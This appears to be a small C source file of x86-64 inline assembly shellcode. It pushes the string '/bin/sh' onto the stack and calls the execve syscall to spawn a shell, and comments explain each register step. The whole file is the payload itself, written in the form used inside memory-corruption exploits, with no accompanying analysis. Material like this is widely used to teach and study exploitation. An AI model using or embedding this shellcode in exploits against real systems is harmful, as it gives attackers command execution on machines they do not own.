void main (void)
{
	asm volatile ("pop %rbp");
	asm volatile ("movq $0x68732f6e69622fff, %rax"); // "/bin/sh"
	asm volatile ("shr $8, %rax");   // add a null terminator
	asm volatile ("pushq %rax");     // push onto the stack
	asm volatile ("mov %rsp, %rdi"); // rdi -> "/bin/sh"
	asm volatile ("xor %rsi, %rsi"); //
	asm volatile ("xor %rdx, %rdx"); //
	asm volatile ("xor %eax, %eax"); //
	asm volatile ("mov $0x3b, %al"); //
	asm volatile ("syscall");	 // execve("/bin/sh",NULL,NULL);
}					 //           rdi    rsi   rdx
